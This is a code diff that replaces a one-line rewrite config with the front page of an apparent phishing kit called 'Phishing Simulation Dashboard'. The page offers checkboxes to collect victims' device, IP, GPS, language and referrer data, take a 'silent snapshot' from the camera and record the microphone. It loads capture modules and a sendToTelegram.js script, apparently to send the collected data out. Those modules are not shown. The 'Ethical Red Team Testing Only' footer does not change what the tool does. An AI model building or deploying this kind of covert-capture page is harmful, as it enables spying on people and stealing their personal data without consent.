@@ -1,1 +1,104 @@
-{ "rewrites": [{ "source": "/(.*)", "destination": "/index.html" }] }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Phishing Simulation Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: #f5f7fa;
+      color: #333;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      padding: 30px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.05);
+    }
+    h1 {
+      font-size: 24px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .feature-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .feature-list label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 15px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
+      color: white;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Phishing Simulation Dashboard</h1>
+    <div class="feature-list">
+      <label><input type="checkbox" id="deviceInfo" checked /> Collect Device Info</label>
+      <label><input type="checkbox" id="ipInfo" checked /> Collect IP & ISP Info</label>
+      <label><input type="checkbox" id="gps" /> Request GPS Location</label>
+      <label><input type="checkbox" id="camera" /> Take Silent Snapshot</label>
+      <label><input type="checkbox" id="microphone" /> Record Microphone Audio</label>
+      <label><input type="checkbox" id="screen" /> Collect Screen Resolution</label>
+      <label><input type="checkbox" id="lang" /> Collect Language</label>
+      <label><input type="checkbox" id="referrer" /> Collect Referrer</label>
+    </div>
+    <button onclick="startSimulation()">🚀 Start Simulation</button>
+    <div class="footer">By Cobrax9 | Ethical Red Team Testing Only</div>
+  </div>
+
+  <script src="modules/sendToTelegram.js"></script>
+  <script src="modules/device.js"></script>
+  <script src="modules/gps.js"></script>
+  <script src="modules/camera.js"></script>
+  <script src="modules/mic.js"></script>
+  <script>
+    function startSimulation() {
+      const selected = {
+        deviceInfo: document.getElementById('deviceInfo').checked,
+        ipInfo: document.getElementById('ipInfo').checked,
+        gps: document.getElementById('gps').checked,
+        camera: document.getElementById('camera').checked,
+        microphone: document.getElementById('microphone').checked,
+        screen: document.getElementById('screen').checked,
+        lang: document.getElementById('lang').checked,
+        referrer: document.getElementById('referrer').checked,
+      };
+      if (selected.deviceInfo || selected.ipInfo) startDeviceInfo(selected);
+      if (selected.gps) setTimeout(() => startGPS(), 500);
+      if (selected.camera) setTimeout(() => startCameraSnapshot(), 1500);
+      if (selected.microphone) setTimeout(() => startMicCapture(), 2500);
+    }
+  </script>
+</body>
+</html>
